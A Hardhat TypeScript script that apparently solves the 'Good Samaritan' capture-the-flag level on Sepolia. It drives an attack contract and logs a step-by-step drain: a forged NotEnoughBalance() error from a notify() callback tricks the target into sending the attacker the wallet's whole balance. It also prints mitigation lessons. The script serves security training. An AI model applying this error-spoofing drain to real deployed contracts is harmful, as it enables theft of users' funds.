import { ethers } from "hardhat";

/**
 * Execute the Good Samaritan attack to drain all coins from the wallet
 * 
 * Usage:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress npx hardhat run scripts/level-27-good-samaritan/attack.ts --network sepolia
 * 
 * Or with explicit GoodSamaritan address:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress GOOD_SAMARITAN_ADDRESS=0xGoodSamaritanAddress npx hardhat run scripts/level-27-good-samaritan/attack.ts --network sepolia
 */
async function main() {
  console.log("Executing Good Samaritan attack...\n");
  
  // Get the addresses from environment
  const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS;
  
  if (!attackContractAddress) {
    throw new Error("Environment variable ATTACK_CONTRACT_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the attack contract
    const attackContract = await ethers.getContractAt("GoodSamaritanAttack", attackContractAddress);
    
    // Get the GoodSamaritan address from the attack contract
    const goodSamaritanAddress = await attackContract.goodSamaritan();
    const goodSamaritan = await ethers.getContractAt("GoodSamaritan", goodSamaritanAddress);
    
    // Get Wallet and Coin addresses
    const walletAddress = await goodSamaritan.wallet();
    const coinAddress = await goodSamaritan.coin();
    
    console.log("=== Contract Addresses ===");
    console.log(`Attack Contract: ${attackContractAddress}`);
    console.log(`GoodSamaritan: ${goodSamaritanAddress}`);
    console.log(`Wallet: ${walletAddress}`);
    console.log(`Coin: ${coinAddress}`);
    
    // Check balances before attack
    const walletBalanceBefore = await attackContract.getWalletBalance();
    const attackerBalanceBefore = await attackContract.getBalance();
    
    console.log("\n=== Balances Before Attack ===");
    console.log(`Wallet balance: ${walletBalanceBefore.toString()} coins`);
    console.log(`Attacker balance: ${attackerBalanceBefore.toString()} coins`);
    
    if (walletBalanceBefore === 0n) {
      console.log("\n⚠️  Warning: Wallet has no coins to drain!");
      return;
    }
    
    // Execute the attack
    console.log("\n=== Executing Attack ===");
    console.log("Calling attack() on GoodSamaritanAttack...");
    console.log("\n📋 Attack Flow:");
    console.log("1. attack() calls goodSamaritan.requestDonation()");
    console.log("2. GoodSamaritan tries to donate 10 coins via wallet.donate10()");
    console.log("3. Wallet transfers 10 coins, triggering coin.transfer()");
    console.log("4. coin.transfer() calls our notify(10) function");
    console.log("5. Our notify() reverts with NotEnoughBalance() error");
    console.log("6. GoodSamaritan catches the error and thinks wallet is empty");
    console.log("7. GoodSamaritan calls wallet.transferRemainder()");
    console.log("8. Wallet transfers ALL remaining coins to us");
    console.log("9. coin.transfer() calls our notify(1000000)");
    console.log("10. Our notify() allows the transfer (amount != 10)");
    console.log("11. We receive all the coins! 💰\n");
    
    const tx = await attackContract.attack();
    console.log("Transaction hash:", tx.hash);
    console.log("Waiting for confirmation...");
    
    const receipt = await tx.wait();
    console.log("✓ Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Check balances after attack
    const walletBalanceAfter = await attackContract.getWalletBalance();
    const attackerBalanceAfter = await attackContract.getBalance();
    
    console.log("\n=== Balances After Attack ===");
    console.log(`Wallet balance: ${walletBalanceAfter.toString()} coins`);
    console.log(`Attacker balance: ${attackerBalanceAfter.toString()} coins`);
    
    // Calculate how much was stolen
    const stolen = attackerBalanceAfter - attackerBalanceBefore;
    
    if (walletBalanceAfter === 0n && attackerBalanceAfter > attackerBalanceBefore) {
      console.log("\n✅ SUCCESS! Attack completed successfully!");
      console.log(`💰 Stolen ${stolen.toString()} coins from the Good Samaritan's wallet!`);
      console.log("\n🎉 The wallet has been completely drained!");
      
      console.log("\n📚 Key Learnings:");
      console.log("1. Custom errors can be manipulated if not validated properly");
      console.log("2. Error handling logic should not make assumptions about error sources");
      console.log("3. Callbacks to untrusted contracts can be exploited");
      console.log("4. The notify pattern should validate the caller or error conditions");
      
      console.log("\n🔒 How to prevent this:");
      console.log("- Validate error sources (check that error came from expected contract)");
      console.log("- Don't use try-catch for control flow based on external calls");
      console.log("- Implement access controls on sensitive operations");
      console.log("- Consider using checks-effects-interactions pattern");
      
    } else if (attackerBalanceAfter === attackerBalanceBefore) {
      console.log("\n❌ Attack failed! No coins were stolen.");
      console.log("The wallet balance remains unchanged.");
      console.log("\nPossible issues:");
      console.log("- The attack contract may not be correctly implemented");
      console.log("- The notify() function may not be reverting properly");
      console.log("- Check that the custom error signature matches exactly");
    } else {
      console.log("\n⚠️  Partial success!");
      console.log(`Stolen ${stolen.toString()} coins, but wallet still has ${walletBalanceAfter.toString()} coins.`);
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing attack:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
